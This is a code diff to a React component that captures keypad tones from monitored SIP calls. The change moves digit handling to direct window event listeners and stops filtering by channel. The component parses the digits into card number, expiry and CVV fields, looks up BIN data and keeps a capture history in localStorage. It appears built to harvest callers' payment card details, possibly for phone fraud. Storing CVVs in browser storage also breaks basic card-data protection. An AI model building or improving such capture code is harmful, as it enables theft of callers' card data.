@@ -1,6 +1,6 @@
 import { useState, useEffect, useCallback, useRef } from 'react';
 import { wsSend } from '../../hooks/useWebSocket';
-import { useWsMessage } from '../../hooks/useWsMessage';
+// Direct event listeners used instead of useWsMessage for rapid DTMF digits
 
 export interface CaptureHistoryEntry {
   timestamp: number;
@@ -64,10 +64,8 @@ export function DtmfCaptureModal({ channel, sipUser, onClose }: DtmfCaptureModal
   const [rawDigits, setRawDigits] = useState<string[]>([]);
   const [binData, setBinData] = useState<any>(null);
   const [fieldStatus, setFieldStatus] = useState<Record<FieldName, string>>({ CC: 'Capturing...', EXP: 'Waiting', CVV: 'Waiting' });
-  const dtmfMsg = useWsMessage<any>('dtmf_digit');
-  const dtmfDone = useWsMessage<any>('dtmf_done');
-  const prevDigitRef = useRef<any>(null);
   const handleDigitRef = useRef<(d: string) => void>(() => {});
+  const saveAndCloseRef = useRef<(reason: 'hangup' | 'stopped') => void>(() => {});
 
   const handleDigit = useCallback((digit: string) => {
     setRawDigits(prev => [...prev, digit]);
@@ -147,14 +145,33 @@ export function DtmfCaptureModal({ channel, sipUser, onClose }: DtmfCaptureModal
     } catch {}
   };
 
-  // Keep ref current and wire up effects AFTER handleDigit is defined
+  // Keep refs current
   useEffect(() => { handleDigitRef.current = handleDigit; }, [handleDigit]);
 
+  // Direct event listener for DTMF digits — bypasses React state batching
+  // V1 uses direct DOM: handleDtmf(msg) -> handleDtmfDigit(msg.digit)
   useEffect(() => {
-    if (!dtmfMsg || dtmfMsg === prevDigitRef.current) return;
-    prevDigitRef.current = dtmfMsg;
-    handleDigitRef.current(dtmfMsg.digit);
-  }, [dtmfMsg]);
+    const onDigit = (e: Event) => {
+      const msg = (e as CustomEvent).detail;
+      // Accept ALL dtmf_digit events — backend already filters by monitor
+      // Channel may differ (trunk vs user channel) so don't filter by channel
+      if (msg?.type === 'dtmf_digit') {
+        handleDigitRef.current(msg.digit);
+      }
+    };
+    const onDone = (e: Event) => {
+      const msg = (e as CustomEvent).detail;
+      if (msg?.type === 'dtmf_done') {
+        saveAndCloseRef.current('hangup');
+      }
+    };
+    window.addEventListener('ws-message', onDigit);
+    window.addEventListener('ws-message', onDone);
+    return () => {
+      window.removeEventListener('ws-message', onDigit);
+      window.removeEventListener('ws-message', onDone);
+    };
+  }, [channel]);
 
   const saveAndClose = useCallback((reason: 'hangup' | 'stopped') => {
     // Save to localStorage if any digits were captured
@@ -181,9 +198,8 @@ export function DtmfCaptureModal({ channel, sipUser, onClose }: DtmfCaptureModal
     onClose();
   }, [onClose, binData]);
 
-  useEffect(() => {
-    if (dtmfDone && dtmfDone.channel === channel) saveAndClose('hangup');
-  }, [dtmfDone, channel, saveAndClose]);
+  // Keep saveAndCloseRef current
+  useEffect(() => { saveAndCloseRef.current = saveAndClose; }, [saveAndClose]);
 
   const stopListening = () => {
     wsSend({ cmd: 'stop_listening', channel });
